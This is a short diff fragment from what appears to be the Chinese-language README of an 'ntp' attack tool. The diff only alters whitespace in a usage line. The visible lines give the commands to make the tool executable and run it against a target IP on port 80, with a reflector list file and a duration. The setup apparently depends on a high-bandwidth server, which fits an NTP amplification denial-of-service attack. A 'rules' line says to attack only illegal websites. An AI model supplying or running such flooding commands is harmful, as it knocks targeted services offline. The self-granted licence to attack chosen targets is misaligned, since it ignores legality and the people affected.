@@ -14,7 +14,7 @@
             - 3.连接[大流量服务器]
 
 >>>chmod 777 ntp
->>> ./ntp ip 80 ntpcan.txt 2 -1 120
+>>>./ntp ip 80 ntpcan.txt 2 -1 120
 
 ** 法则: **
     - 1.只攻击非法网站; 
